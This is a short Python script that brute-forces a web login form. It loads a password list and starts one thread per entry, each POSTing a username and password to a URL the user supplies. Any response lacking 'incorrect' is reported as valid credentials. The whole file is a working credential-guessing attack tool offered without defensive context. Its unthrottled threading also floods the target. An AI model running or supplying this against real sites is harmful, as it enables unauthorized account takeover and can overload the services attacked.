import requests
from threading import Thread

def list_loader(filename: str):
    with open(filename) as f:
        lines = f.readlines()
    return lines

def brute_force(url, username, password):
    data = {"username": username, "password": password.strip()}
    response = requests.post(url, data=data)
    if "incorrect" not in response.text.lower():
        print(f"[+] Found valid credentials: {username}:{password}")
        return

def main():
    url = input("Enter the url: ")
    username = input("Enter the username: ")
    passwords = list_loader(input("Enter the password file location: "))
    threads = []

    for password in passwords:
        t = Thread(target=brute_force, args=(url, username, password))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
